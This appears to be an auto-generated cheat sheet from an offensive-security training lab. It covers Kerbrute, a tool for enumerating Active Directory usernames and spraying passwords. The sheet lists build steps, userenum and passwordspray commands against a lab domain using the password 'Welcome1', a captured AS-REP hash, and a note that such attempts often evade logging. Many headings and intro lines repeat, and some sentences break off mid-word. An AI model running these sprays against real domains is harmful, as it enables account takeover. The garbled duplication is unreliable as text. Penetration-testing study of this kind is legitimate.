# Kerbrute

% kerbrute, kerberos, cpts

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - kerbrute---internal-ad-username-enumeration
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
[Kerbrute](https://github.com/ropnop/kerbrute) can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We

```
sudo git clone https://github.com/ropnop/kerbrute.git
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - kerbrute---internal-ad-username-enumeration-2
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
[Kerbrute](https://github.com/ropnop/kerbrute) can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We

```
cd kerbrute
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - kerbrute---internal-ad-username-enumeration-3
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
[Kerbrute](https://github.com/ropnop/kerbrute) can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We

```
sudo make all
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - kerbrute---internal-ad-username-enumeration-4
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
[Kerbrute](https://github.com/ropnop/kerbrute) can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We

```
ls dist/
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - kerbrute---internal-ad-username-enumeration-5
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
```
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - kerbrute
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - kerbrute-2
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - compiling-for-multiple-platforms-and-architectures
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Initial Enumeration of the Domain

```
cd /tmp/kerbrute
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - compiling-for-multiple-platforms-and-architectures-2
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Initial Enumeration of the Domain

```
rm -f kerbrute kerbrute.exe kerbrute kerbrute.exe kerbrute.test kerbrute.test.exe kerbrute.test kerbrute.test.exe main main.exe
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - compiling-for-multiple-platforms-and-architectures-3
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Initial Enumeration of the Domain

```
rm -f /root/go/bin/kerbrute
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - testing-the-kerbrute_linux_amd64-binary
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Initial Enumeration of the Domain

```
./kerbrute_linux_amd64
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - testing-the-kerbrute_linux_amd64-binary-2
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Initial Enumeration of the Domain

```
kerbrute [command]
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - moving-the-binary
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Initial Enumeration of the Domain

```
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - retrieving-the-as-rep-using-kerbrute
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Miscellaneous Misconfigurations

```
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - enumerate-valid-usernames-using-kerbrute-and-the-wordlist-located-at-o
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Students then need to use `Kerbrute` to enumerate valid domain usernames via Kerberos in the target domain:

```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -t 40
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - enumerate-valid-usernames-using-kerbrute-and-the-wordlist-located-at-o-2
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
```
└──╼ $kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt -t 40
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - find-the-user-account-starting-with-the-letter-s-that-has-the-password
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
Students now need to use `Kerbrute` to perform a password spraying attack using the usernames harvested by `enum4linux` and the password `Welcome1`; students will find out that the user account is `sgage`:

```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 validUsers.txt Welcome1
```

## Kerbrute - Kerbrute - Kerbrute - Kerbrute - find-the-user-account-starting-with-the-letter-s-that-has-the-password-2
#cat/ATTACK/BRUTEFORCE-SPRAY #cpts
```
└──╼ $kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 validUsers.txt Welcome1
```

